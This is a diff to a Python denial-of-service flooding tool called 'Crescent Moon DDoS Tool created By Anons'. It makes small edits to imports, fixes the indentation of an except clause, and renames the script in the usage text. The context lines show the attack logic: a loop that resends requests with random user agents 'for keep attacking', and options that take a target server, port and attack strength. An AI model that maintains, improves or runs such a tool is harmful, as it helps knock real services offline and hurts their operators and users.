@@ -3,7 +3,7 @@
 
 from queue import Queue
 from optparse import OptionParser
-import time,sys,socket,threading,logging,urllib.request,random
+import time, sys, socket, threading, logging, urllib, requests, random
 
 # My Hax Stroke Color Console
 W  = '\033[0m'    # white (default)
@@ -287,7 +287,7 @@ def bots_reloading(url):
             req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
             print(GR+"► Reloading some requests for keep attacking ◄")
             time.sleep(0.1)
-	except:
+    except:
         time.sleep(0.1)
 
 def down_it(item):
@@ -350,7 +350,7 @@ def usage():
                       ,:'               |     '
         '''+W+'''    Crescent Moon DDoS Tool created By Anons'''+W+'''        
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬'''+P+'''
- python3 CrescentMoon.py   |-s or --server |-p or --port |-l or --level
+ python3 moon.py   |-s or --server |-p or --port |-l or --level
  --server or -s: server for attack ip                          
  --port or -p: port default 80                                 
  --level or -l: power of attack default 60                     
